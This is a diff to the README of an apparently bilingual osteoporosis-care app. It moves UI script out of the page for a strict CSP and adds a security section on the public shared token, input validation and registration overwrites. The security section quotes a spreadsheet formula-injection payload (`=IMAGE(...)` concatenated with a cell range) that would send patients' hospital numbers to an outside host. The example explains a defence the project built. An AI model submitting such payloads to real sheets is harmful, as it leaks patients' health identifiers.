@@ -7,8 +7,12 @@ review, all built around a **risk-tier + balance-level resolver**.
 
 ## Structure
 
-- `index.html` — the app shell: eight tabs, forms, charts, and state in
-  `localStorage` under `OSTEO_STATE`. No build step.
+- `index.html` — the page: markup, styles and the Content-Security-Policy.
+- `app-ui.js` — the interface: eight tabs, forms, charts, sync, and state in
+  `localStorage` under `OSTEO_STATE`. No build step. It was inline in
+  `index.html` until 2026-09-24; it is a file so the CSP can be
+  `script-src 'self'` — never put a `<script>` block or an `onclick="…"`
+  back into the page, the browser will refuse to run it.
 - `app-core.js` — pure, dependency-free logic and content shared by the
   browser and the Node test suite: the `CONTENT` TH/EN dictionary, the
   tier and balance-level resolvers, medication schedules and care
@@ -204,7 +208,7 @@ replacing anything already there.
 4. Confirm it took: open the `/exec` URL in a browser. It answers
 
    ```json
-   {"ok":true,"service":"osteoporosis-care","version":"2026-09-05","tokenConfigured":true,"sheets":[...]}
+   {"ok":true,"service":"osteoporosis-care","version":"2026-09-24","tokenConfigured":true,"sheets":[...]}
    ```
 
    If `version` is not the one in the file you just pasted, step 3 did
@@ -212,12 +216,34 @@ replacing anything already there.
 
 Access must be **Anyone**, not "Anyone with a Google account" — the
 latter answers with a login page the app cannot follow. `SHARED_TOKEN`
-must be identical in `Code.gs` and `index.html`.
+must be identical in `Code.gs` and `app-ui.js`.
 
 Sheets are created on first write: Registrations, CheckIns, Falls,
 Adherence, Nutrition, Bmd, FractureRisk. Same-day check-in, nutrition, BMD and
 FRAX records merge into one row; a second fall on the same day is kept
 as a separate event; an exact repeat is skipped.
+
+### Security — read before the pilot
+
+- **`SHARED_TOKEN` is not a password.** It ships inside the app and the
+  code is public, so anyone can read it and post to the `/exec` URL. The
+  Sheet is patient-reported data from an open endpoint; treat it as
+  unverified.
+- **The script therefore trusts nothing it receives** (version
+  2026-09-24): the HN must be letters, digits, `-` or `/`; dates must be
+  `YYYY-MM-DD`; text is capped at 200 characters; and anything starting
+  with `=`, `+`, `-` or `@` is stored as text, never as a formula. Before
+  that version a "fall cause" such as `=IMAGE("https://…"&B2:B)` would have
+  become a live formula able to send other patients' HNs out of the Sheet
+  when it was opened. `tests/t19_security.js` runs the script against a
+  stand-in Sheet to hold this.
+- **A registration is never overwritten.** A different registration for an
+  HN already in the Sheet is added as a new row, so someone typing another
+  patient's HN cannot replace that patient's details. More than one row for
+  an HN is worth checking.
+- **Share the Google Sheet only with the care team** — it holds HNs and
+  health data. The app keeps its own copy on the phone in `localStorage`;
+  "ล้างข้อมูลและเริ่มใหม่" in the footer erases it on a shared phone.
 
 ### If data still does not arrive
 
@@ -236,7 +262,7 @@ backend covering both the accepted and rejected cases.
 
 ## Deploying the app
 
-Static hosting (e.g. GitHub Pages): `index.html`, `app-core.js`,
+Static hosting (e.g. GitHub Pages): `index.html`, `app-core.js`, `app-ui.js`,
 `manifest.webmanifest`, `sw.js`, `icon.svg` and `media/`.
 
 ## Before a real pilot (do not skip)
